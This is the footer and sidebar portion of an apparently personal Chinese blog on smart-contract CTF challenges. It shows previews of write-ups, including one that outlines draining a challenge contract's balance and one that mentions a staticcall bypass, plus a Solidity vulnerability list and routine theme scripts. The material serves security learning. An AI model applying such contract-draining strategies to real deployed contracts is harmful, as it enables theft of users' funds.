class="info-item-1">心想事成考察的主要是关于wish_made(address)这个映射的变化从而让三元运算符给出不同的值，然后完成题目的要求通过这个题目。需要注意的是我们调用的地址需要时EOA的地址不是攻击合约的地址。（其中这个是按照正常逻辑来的，更高深的一点就是按照我们的staiticall绕过漏洞） 目标合约： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Wish_Maker &#123;    function wish_amount() external view returns (uint256);&#125;contract Make_a_wish &#123;    address public owner;   ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/01/19/DLNU25ctfwp/" title="DLNU25ctf考核wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-19</div><div class="info-item-2">DLNU25ctf考核wp</div></div><div class="info-2"><div class="info-item-1">考核wp[toc] Pigeon合约这个题需要我们满足：盗走合约余额，并且使我们所有。 逻辑关键点在于task函数、flyway函数以及promotion函数，我们需要通过调用task函数积累任务点数，任务点数可以晋升。再加上你随时可以飞走，而晋升是需要扣掉你的余额的，但是飞走可以让你带走余额。所以我们可以先成为鸽子，薅空投可以获得4余额，然后调用2次task函数，一次4，两次8 ，然后飞走，晋升中级鸽子；再调用task,一次4 三次12，可以晋升到高级鸽子。这样可以无损晋升。 合约突破点在晋升时，我们的名字拥有一次重命名的机会，而名字是通过codename = keccak256(abi.encodePacked(&quot;code&quot;,...</div></div></div></a><a class="pagination-related" href="/2025/01/19/Chainlink%20%E4%BB%B7%E6%A0%BC%E9%A2%84%E8%A8%80%E6%9C%BA/" title="Chainlink 价格预言机"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-19</div><div class="info-item-2">Chainlink 价格预言机</div></div><div class="info-2"><div class="info-item-1">Chainlink...</div></div></div></a><a class="pagination-related" href="/2025/01/19/Typora%20%E7%AC%94%E8%AE%B0/" title="Typora 笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-19</div><div class="info-item-2">Typora 笔记</div></div><div class="info-2"><div class="info-item-1">Typora 笔记[TOC] PS：除文字外，符号最好是英文状态下输入，中文状态下的符号无法转义。 部分操作可以通过快捷指令设置。 目录：[TOC] 或者 [toc] 1. 标题​	标题：一个#加空格。（可以多级标题） 123456# 标题## 标题### 标题#### 标题##### 标题###### 标题    2. 引用​	引用：”&gt;”加空格。(可以多级引用，重复上述操作即可） ​	PS：使用多行引用时，上一行引用需要有内容。(如果没有会清除引用符号)  ​    引用    3. 字体字体：：一对”**”是斜体；两对是加粗；三对是斜体加粗。（选中文本按 “Ctrl”加”B”也可以实现加粗；选中文本按”Ctrl”加”I”可以实现斜体） 小赵 小赵 小赵 4. 列表 有序列表：数字加”.”加空格加文本。(回车可以有序向下延伸) 123 123 123 123   无序列表：一个”+”加空格加文本。（回车可以向下延伸） 123  123     5. 删除线：两对波浪线”~”。我宣布个事儿 6. 高亮：两对等于号”&#x3D;”。...</div></div></div></a><a class="pagination-related" href="/2025/01/19/VScode_useful/" title="VScode快捷键"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-19</div><div class="info-item-2">VScode快捷键</div></div><div class="info-2"><div class="info-item-1">VS code 快捷键： alt + shift + f 格式化代码 alt + shift + a 单块注释 alt + 鼠标左键，多出光标同时操作 ctrl + shift + L 重命名变量 alt + shift + P 打开 VScode 的命令面板 ctrl + shift + V 打开 markdown 预览（需要装插件） alt + Z 自动换行 alt + &lt;- 快速回到上次编辑的位置 alt + -&gt; 快速回到下次编辑的位置  基本编辑 复制行向下：Shift + Alt + ↓ 复制行向上：Shift + Alt + ↑ 移动行向下：Alt + ↓ 移动行向上：Alt + ↑ 删除行：Ctrl + Shift + K 插入行下方：Ctrl + Enter 插入行上方：Ctrl + Shift + Enter 跳到行首&#x2F;行尾：Home &#x2F; End 跳到文件开头&#x2F;结尾：Ctrl + Home &#x2F; Ctrl + End 注释&#x2F;取消注释当前行：Ctrl + / 块注释：Shift + Alt +...</div></div></div></a><a class="pagination-related" href="/2025/01/19/R3CTF/" title="R3CTF_blockchain"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-19</div><div class="info-item-2">R3CTF_blockchain</div></div><div class="info-2"><div class="info-item-1">R3CTF_blockchain这个合约 Vault 是一个基于 ERC4626 标准的简化版代币化金库（Tokenized Vault），可以接受一个特定的 LING 代币的存款，发行代表份额的 vLING...</div></div></div></a><a class="pagination-related" href="/2025/01/19/bug/" title="基础漏洞目录"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-19</div><div class="info-item-2">基础漏洞目录</div></div><div class="info-2"><div class="info-item-1">基础漏洞 重入漏洞（Reentrancy） 访问权限漏洞 不可预期的 Ether 类型转换遇到的问题 私有变量访问 合约插槽（slot）布局，数组，动态数组，映射实际存储插槽位置   整数溢出（Overflow） 坏随机数（Bad Random） tx.origin 钓鱼 EOA 检测绕过 拒绝服务攻击（DoS） 未检查的低级调用 Create2 合约地址预测 薅羊毛攻击 delegatecall 修改状态变量，状态变量布局发生变化出现非预期错误（合约插槽冲突） 函数选择器冲突漏洞（可升级合约、Proxy 合约）  &#x3D;&#x3D;学漏洞的同时，记得练 Foundry 命令以及 Foundry Test（单元，集成，Fuzzing），Script 脚本&#x3D;&#x3D; 推荐链接：  wtf solidity 104 合约安全：https://www.wtf.academy/docs/solidity-104/ Ethernaut...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">zhaojx</div><div class="author-info-description">寻常朝暮，只身留我一人南渡.</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:zhaojinxiu6@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%90%88%E7%BA%A6%E4%BD%BF%E7%94%A8assembly%E6%93%8D%E4%BD%9Ccalldata%E4%BB%A5%E5%8F%8Alow-level-call%E6%8E%A5%E5%8F%97%E6%95%B0%E6%8D%AE%E7%9A%84%E5%BC%8A%E7%AB%AF%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">关于合约使用assembly操作calldata以及low-level call接受数据的弊端：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#assembly-%E6%93%8D%E4%BD%9C-calldata-%E7%9A%84%E5%BC%8A%E7%AB%AF"><span class="toc-number">1.1.</span> <span class="toc-text">assembly 操作 calldata 的弊端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8E%E7%BA%A7-call-%E7%9A%84%E5%BC%8A%E7%AB%AF"><span class="toc-number">1.2.</span> <span class="toc-text">低级 call 的弊端</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BB%A5-function-flipSwitch-bytes-memory-data-%E4%B8%BA%E4%BE%8B%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">✅ 以 function flipSwitch(bytes memory _data) 为例：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%91%87-%E4%B8%BA%E4%BB%80%E4%B9%88%E6%98%AF-0x60%EF%BC%9F"><span class="toc-number">1.2.2.</span> <span class="toc-text">👇 为什么是 0x60？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%B8%BE%E4%B8%AA%E5%85%B7%E4%BD%93%E4%BE%8B%E5%AD%90"><span class="toc-number">1.2.3.</span> <span class="toc-text">✅ 举个具体例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E5%A6%82%E6%9E%9C%E6%98%AF-0x60-%E5%81%8F%E7%A7%BB"><span class="toc-number">1.2.4.</span> <span class="toc-text">🧠 如果是 0x60 偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.5.</span> <span class="toc-text">✅ 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%94%E8%BE%83memory%E5%92%8Ccalldata"><span class="toc-number">1.2.6.</span> <span class="toc-text">比较memory和calldata</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/19/DLNU25ctfwp/" title="DLNU25ctf考核wp">DLNU25ctf考核wp</a><time datetime="2025-01-19T14:00:37.000Z" title="发表于 2025-01-19 22:00:37">2025-01-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/19/Chainlink%20%E4%BB%B7%E6%A0%BC%E9%A2%84%E8%A8%80%E6%9C%BA/" title="Chainlink 价格预言机">Chainlink 价格预言机</a><time datetime="2025-01-19T14:00:37.000Z" title="发表于 2025-01-19 22:00:37">2025-01-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/19/Typora%20%E7%AC%94%E8%AE%B0/" title="Typora 笔记">Typora 笔记</a><time datetime="2025-01-19T14:00:37.000Z" title="发表于 2025-01-19 22:00:37">2025-01-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/19/VScode_useful/" title="VScode快捷键">VScode快捷键</a><time datetime="2025-01-19T14:00:37.000Z" title="发表于 2025-01-19 22:00:37">2025-01-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/01/19/R3CTF/" title="R3CTF_blockchain">R3CTF_blockchain</a><time datetime="2025-01-19T14:00:37.000Z" title="发表于 2025-01-19 22:00:37">2025-01-19</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/background3.jpg);"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By zhaojx</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="2520739691" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="false"> </div><script defer src="/js/denglong.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      pjax.loadUrl('/404.html')
+    }
+  })
+})()</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
